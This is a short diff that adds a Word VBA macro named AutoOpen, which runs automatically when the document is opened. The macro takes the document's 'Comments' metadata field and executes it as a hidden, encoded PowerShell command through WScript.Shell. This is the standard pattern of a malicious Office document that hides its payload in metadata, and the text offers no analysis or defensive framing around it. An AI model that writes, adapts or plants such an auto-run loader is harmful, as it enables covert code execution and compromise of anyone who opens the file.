@@ -1,0 +1,11 @@
+Sub AutoOpen()
+    Dim author As String
+    comments = ActiveDocument.BuiltinDocumentProperties("Comments")
+    
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+    
+    cmd = "powershell.exe -nop -WindowStyle hidden -encodedCommand " + comments
+
+    ws.Exec(cmd)
+End Sub
